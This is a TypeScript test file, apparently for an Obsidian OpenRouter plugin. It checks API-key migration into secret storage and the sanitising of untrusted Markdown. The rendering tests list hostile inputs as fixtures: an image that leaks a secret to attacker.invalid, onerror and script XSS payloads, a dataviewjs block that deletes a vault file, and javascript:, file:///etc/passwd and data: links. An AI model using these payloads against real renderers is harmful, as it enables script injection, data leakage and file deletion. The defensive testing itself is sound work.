import { describe, expect, it, vi } from 'vitest';
import { migrateSettings, readSettings, type Secrets } from '../src/settings';
import { renderMessage, safeLink } from '../src/render';

function storage(initial: Record<string, string> = {}): Secrets {
  const values = new Map(Object.entries(initial));
  return { getSecret: id => values.get(id) ?? null, setSecret: (id, value) => { values.set(id, value); } };
}

describe('credential migration', () => {
  it('stores and verifies the key before removing plaintext from settings', async () => {
    const secrets = storage();
    const save = vi.fn(async (data) => {
      expect(secrets.getSecret(data.secretName)).toBe('dummy-key');
      expect(JSON.stringify(data)).not.toContain('dummy-key');
      expect(data).not.toHaveProperty('apiKey');
    });
    const migrated = await migrateSettings({ apiKey: 'dummy-key', useStreaming: false }, secrets, save);
    expect(migrated.secretName).toBe('openrouter-api-key');
    expect(save).toHaveBeenCalledOnce();
  });
  it('does not overwrite another plugin/user secret', async () => {
    const secrets = storage({ 'openrouter-api-key': 'other-key' });
    const data = await migrateSettings({ apiKey: 'dummy-key' }, secrets, async () => undefined);
    expect(data.secretName).toBe('openrouter-api-key-2');
    expect(secrets.getSecret('openrouter-api-key')).toBe('other-key');
  });
  it('does not erase recoverable settings if storage fails verification', async () => {
    const save = vi.fn();
    await expect(migrateSettings({ apiKey: 'dummy-key' }, { getSecret: () => null, setSecret: () => undefined }, save)).rejects.toThrow('migrate');
    expect(save).not.toHaveBeenCalled();
  });
  it('can retry migration after the settings write fails without duplicating secrets', async () => {
    const secrets = storage();
    await expect(migrateSettings({ apiKey: 'dummy-key' }, secrets, async () => { throw new Error('disk full'); })).rejects.toThrow('disk full');
    const data = await migrateSettings({ apiKey: 'dummy-key' }, secrets, async () => undefined);
    expect(data.secretName).toBe('openrouter-api-key');
  });
  it('keeps an explicitly selected existing secret and removes leftover plaintext', async () => {
    const secrets = storage({ selected: 'selected-key' });
    const data = await migrateSettings({ apiKey: 'old-key', secretName: 'selected' }, secrets, async () => undefined);
    expect(data.secretName).toBe('selected');
    expect(data).not.toHaveProperty('apiKey');
  });
  it('validates corrupt settings and discards unknown fields and legacy free claims', () => {
    const result = readSettings({ apiKey: 'dummy', unknown: 'dummy', cachedModels: [{ id: 'test/model', isFree: true }], requestTimeoutSeconds: 0, maxOutputTokens: Infinity });
    expect(JSON.stringify(result)).not.toContain('dummy');
    expect(result.cachedModels[0]?.isFree).toBe(false);
    expect(result.requestTimeoutSeconds).toBe(120);
    expect(result.maxOutputTokens).toBe(4096);
    expect(readSettings({ cachedModels: null }).cachedModels).toEqual([]);
  });
});

describe('untrusted Markdown rendering', () => {
  it.each([
    '![tracking](https://attacker.invalid/pixel?secret=example)',
    '<img src="https://attacker.invalid/pixel" onerror="alert(1)">',
    '<svg><image href="https://attacker.invalid/pixel" /></svg>',
    '<iframe src="https://attacker.invalid/"></iframe>',
    '<style>@import "https://attacker.invalid/a.css";</style>',
    '<script>alert(1)</script>',
    '![[Private note]]\n```dataviewjs\napp.vault.delete(file)\n```',
    '[run](javascript:alert(1)) [file](file:///etc/passwd) [vault](obsidian://open?vault=private)',
    '![ref][img]\n\n[img]: https://attacker.invalid/pixel',
    '[x](data:text/html;base64,PHNjcmlwdD4=)'
  ])('creates no active content or automatically loading resources: %s', input => {
    const target = document.createElement('div');
    renderMessage(input, target);
    expect(target.querySelector('img,iframe,script,style,svg,object,embed,video,audio,link,source')).toBeNull();
    expect(target.querySelector('[src],[srcset],[onerror],[onclick],[style]')).toBeNull();
    expect(target.querySelector('a')).toBeNull();
  });
  it('retains formatting and makes normal links click-only with no referrer/opener', () => {
    const target = document.createElement('div');
    renderMessage('**Bold** and `code`\n\n[Docs](https://example.com/docs)\n\n- one\n- two', target);
    expect(target.querySelector('strong')?.textContent).toBe('Bold');
    expect(target.querySelector('code')?.textContent).toBe('code');
    expect(target.querySelectorAll('li')).toHaveLength(2);
    const link = target.querySelector('a')!;
    expect(link.href).toBe('https://example.com/docs');
    expect(link.rel).toBe('noopener noreferrer');
    expect(link.getAttribute('referrerpolicy')).toBe('no-referrer');
  });
  it.each(['javascript:alert(1)', 'file:///secret', 'obsidian://open', '//example.com', '/note', 'https://user:password@example.com'])('rejects unsafe or relative link %s', value => {
    expect(safeLink(value)).toBeNull();
  });
});
